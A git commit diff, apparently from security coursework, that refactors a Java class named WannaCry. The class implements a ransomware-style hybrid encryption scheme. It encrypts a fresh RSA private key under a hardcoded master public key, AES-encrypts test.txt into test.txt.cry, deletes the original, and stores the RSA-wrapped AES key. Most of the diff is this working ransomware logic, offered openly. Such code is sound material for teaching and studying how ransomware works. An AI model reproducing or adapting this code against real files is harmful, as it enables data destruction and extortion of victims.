750d414db568b431b14123bb6b769fbb7d1c5e4f
Mo <33751344+V1254@users.noreply.github.com>
2021-02-06 20:24:35 +0000

    small improvements

--- cw1/WannaCry.java
+++ cw1/WannaCry.java
@@ -18,38 +18,33 @@ import javax.crypto.spec.IvParameterSpec;
 public class WannaCry {
 
     private static final String ENCODED_MASTER_RSA_KEY = "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAidRWp1iB0s2LKnAyAxUKCMmsKK9bMTdRUItZVRcV4lB0RXGla0wRTNeR6r5oqNo6poHUJ+QGPjAHDCzt/MjAZdtuMSQ+Lohn+TjDMIEi2sUNeXhZuXchw/EE+3QTgPpIOGhjJtv4wmTjXD5UaZbYWuydNpgvFEDsF4jf02xM8t8a7nOgQIriPi83f/a4XHXcoCcGEHDbpbtYUhVq12rJEBXUoVM1zi9LcDhEsgil/pzRPlkT6zC+89SkgYHWTRtO2shLpJcnThkR1nyLqHU2Zgn1hSrNsy+T97bNL1Umhcs7/e94WJ7WWO6PoSs/t4cknPIZhhRbeBHoJ9rdV+XLBoew7buDQSht2Jn/zAm6A6Pvi+XhLVRlIEMLOsG6Y92Lwhuc21oS/Keqklv9yDfMznJm0aeCbm3TWZehAfPD9EKJ4LgvSVbTtXSiOVvPS8JtzIedISqioSvPPP5v4qqdbqobGBv2uE0sdwYhXh+dTIFSO4WG+dQHMZpdZu38l/FBec3yEuZJuK/pvtX5AvdYgCEwMioZxE3ph4X3S/JEbcqfR1KuuGnYwg6nmSEwotDVg55pEtSsgu3j2KRgM8GA7lkageikM4D6m/q6vQ5fkedfzz8PuvQn/Ne8BH3h2UZYmRjNvfKd8wt2bRKKFK7K4jCYT5riYo+5aEWSSrWvL+ECAwEAAQ==";
-    private static final String FILE_NAME = "test.txt";
-    private static final String ENCRYPTED_FILE_NAME = "test.txt.cry";
-    private static final String WANNA_CRY_KEY_FILE_NAME = "wannacry.key";
-    private static final String AES_KEY_FILE_NAME = "aes.key";
+    private static final String INPUT_FILE = "test.txt";
+    private static final String ENCRYPTED_FILE = "test.txt.cry";
+    private static final String WANNA_CRY_KEY_FILE = "wannacry.key";
+    private static final String AES_KEY_FILE = "aes.key";
 
     public static void main(String[] args) {
         try {
             PublicKey masterRSAPublicKey = generateMasterPublicKey();
             KeyPair freshRSAKeyPair = generateRSAKeyPair();
 
-            byte[] encryptedPrivateKey = encryptKeyWithAnotherKey(freshRSAKeyPair.getPrivate(), masterRSAPublicKey);
-            writeBytesToFile(encryptedPrivateKey, WANNA_CRY_KEY_FILE_NAME);
+            byte[] encryptedPrivateKey = encryptKeyWithRSA(freshRSAKeyPair.getPrivate(), masterRSAPublicKey);
+            writeBytesToFile(encryptedPrivateKey, WANNA_CRY_KEY_FILE);
 
             SecretKey aesKey = generateAESKey();
 
-            byte[] rawText = readBytesFromFile(FILE_NAME);
+            byte[] rawText = readBytesFromFile(INPUT_FILE);
             byte[] encryptedText = encryptWithAES(aesKey, rawText);
-            writeBytesToFile(encryptedText, ENCRYPTED_FILE_NAME);
-            deleteFile(FILE_NAME);
+            writeBytesToFile(encryptedText, ENCRYPTED_FILE);
+            deleteFile(INPUT_FILE);
 
-            byte[] encryptedAesKey = encryptKeyWithAnotherKey(aesKey, freshRSAKeyPair.getPublic());
-            writeBytesToFile(encryptedAesKey, AES_KEY_FILE_NAME);
+            byte[] encryptedAesKey = encryptKeyWithRSA(aesKey, freshRSAKeyPair.getPublic());
+            writeBytesToFile(encryptedAesKey, AES_KEY_FILE);
 
         } catch (Exception e) {
             e.printStackTrace();
         }
 
-    }
-
-    private static void deleteFile(String fileName) throws Exception {
-        File file = new File(fileName);
-        file.delete();
     }
 
     private static PublicKey generateMasterPublicKey() throws Exception {
@@ -71,9 +66,15 @@ public class WannaCry {
         return keyGenerator.generateKey();
     }
 
-    private static byte[] encryptKeyWithAnotherKey(Key keyToEncrypt, Key keyToEncryptWith) throws Exception {
+    private static byte[] encryptWithAES(SecretKey aesKey, byte[] rawText) throws Exception {
+        Cipher aesInstance = Cipher.getInstance("AES/CBC/PKCS5Padding");
+        aesInstance.init(Cipher.ENCRYPT_MODE, aesKey, new IvParameterSpec(new byte[16]));
+        return aesInstance.doFinal(rawText);
+    }
+
+    private static byte[] encryptKeyWithRSA(Key keyToEncrypt, Key encryptionKey) throws Exception {
         Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
-        cipher.init(Cipher.ENCRYPT_MODE, keyToEncryptWith);
+        cipher.init(Cipher.ENCRYPT_MODE, encryptionKey);
         return cipher.doFinal(keyToEncrypt.getEncoded());
     }
 
@@ -88,9 +89,8 @@ public class WannaCry {
         return Files.readAllBytes(file.toPath());
     }
 
-    private static byte[] encryptWithAES(SecretKey aesKey, byte[] rawText) throws Exception {
-        Cipher aesInstance = Cipher.getInstance("AES/CBC/PKCS5Padding");
-        aesInstance.init(Cipher.ENCRYPT_MODE, aesKey, new IvParameterSpec(new byte[16]));
-        return aesInstance.doFinal(rawText);
+    private static void deleteFile(String fileName) throws Exception {
+        File file = new File(fileName);
+        file.delete();
     }
 }
